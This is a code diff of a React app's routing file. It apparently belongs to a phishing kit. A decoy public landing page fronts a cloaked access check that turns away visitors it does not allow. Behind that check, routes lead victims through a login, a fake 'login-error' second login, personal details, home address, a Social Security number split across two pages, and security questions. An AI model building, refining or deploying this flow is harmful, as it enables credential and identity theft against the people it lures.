@@ -1,10 +1,7 @@
 import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
 import useAccessCheck from './Utils/useAccessCheck';
 import { baseUrl } from './constants';
-
-// Components
-import Header from './components/Header';
-import Footer from './components/Footer';
+import FlowLayout from './components/FlowLayout';
 
 // Pages
 import LoginForm from './pages/LoginForm';
@@ -16,36 +13,32 @@ import SSN1 from './pages/SSN1';
 import SSN2 from './pages/SSN2';
 import SecurityQuestions from './pages/SecurityQuestions';
 import Terms from './pages/Terms';
-import OTPVerification from './pages/OTPVerification';
 import LifestyleDemo from './pages/LifestyleDemo';
 
-// Layout component for protected routes
-const ProtectedLayout = ({ children }: { children: React.ReactNode }) => {
+interface ProtectedRouteProps {
+  element: React.ReactNode;
+}
+
+const ProtectedRoute: React.FC<ProtectedRouteProps> = ({ element }) => {
   const isAllowed = useAccessCheck(baseUrl);
 
   if (isAllowed === null) {
-    return <div className="min-h-screen flex items-center justify-center">Loading...</div>;
+    return (
+      <FlowLayout>
+        <div className="text-white">Loading...</div>
+      </FlowLayout>
+    );
   }
 
   if (isAllowed === false) {
-    return <div className="min-h-screen flex items-center justify-center">Access denied. Redirecting...</div>;
+    return (
+      <FlowLayout>
+        <div className="text-white">Access denied. Redirecting...</div>
+      </FlowLayout>
+    );
   }
 
-  return (
-    <div
-      className="min-h-screen flex flex-col overflow-hidden bg-cover bg-center bg-no-repeat relative"
-      style={{ backgroundImage: 'url(/assets/background.jpeg)' }}
-    >
-      <div className="absolute inset-0 bg-black bg-opacity-30" />
-      <div className="relative z-10 flex flex-col min-h-screen">
-        <Header />
-        <main className="flex-1 flex items-center justify-center px-4 py-10">
-          {children}
-        </main>
-        <Footer />
-      </div>
-    </div>
-  );
+  return <FlowLayout>{element}</FlowLayout>;
 };
 
 function App() {
@@ -54,70 +47,18 @@ function App() {
       <Routes>
         {/* Public routes */}
         <Route path="/" element={<LifestyleDemo />} />
-        
+
         {/* Protected routes */}
-        <Route path="/login" element={
-          <ProtectedLayout>
-            <LoginForm />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/login-error" element={
-          <ProtectedLayout>
-            <LoginForm2 />
-          </ProtectedLayout>
-        } />
-        
-  
-        
-        <Route path="/register" element={
-          <ProtectedLayout>
-            <Register />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/basic-info" element={
-          <ProtectedLayout>
-            <BasicInfo />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/home-address" element={
-          <ProtectedLayout>
-            <HomeAddress />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/ssn1" element={
-          <ProtectedLayout>
-            <SSN1 />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/ssn2" element={
-          <ProtectedLayout>
-            <SSN2 />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/security-questions" element={
-          <ProtectedLayout>
-            <SecurityQuestions />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/terms" element={
-          <ProtectedLayout>
-            <Terms />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/otp-verification" element={
-          <ProtectedLayout>
-            <OTPVerification />
-          </ProtectedLayout>
-        } />
-        
+        <Route path="/login" element={<ProtectedRoute element={<LoginForm />} />} />
+        <Route path="/login-error" element={<ProtectedRoute element={<LoginForm2 />} />} />
+        <Route path="/register" element={<ProtectedRoute element={<Register />} />} />
+        <Route path="/basic-info" element={<ProtectedRoute element={<BasicInfo />} />} />
+        <Route path="/home-address" element={<ProtectedRoute element={<HomeAddress />} />} />
+        <Route path="/ssn1" element={<ProtectedRoute element={<SSN1 />} />} />
+        <Route path="/ssn2" element={<ProtectedRoute element={<SSN2 />} />} />
+        <Route path="/security-questions" element={<ProtectedRoute element={<SecurityQuestions />} />} />
+        <Route path="/terms" element={<ProtectedRoute element={<Terms />} />} />
+
         {/* Redirect any unknown routes to home */}
         <Route path="*" element={<Navigate to="/" replace />} />
       </Routes>
@@ -126,5 +67,3 @@ function App() {
 }
 
 export default App;
-
-
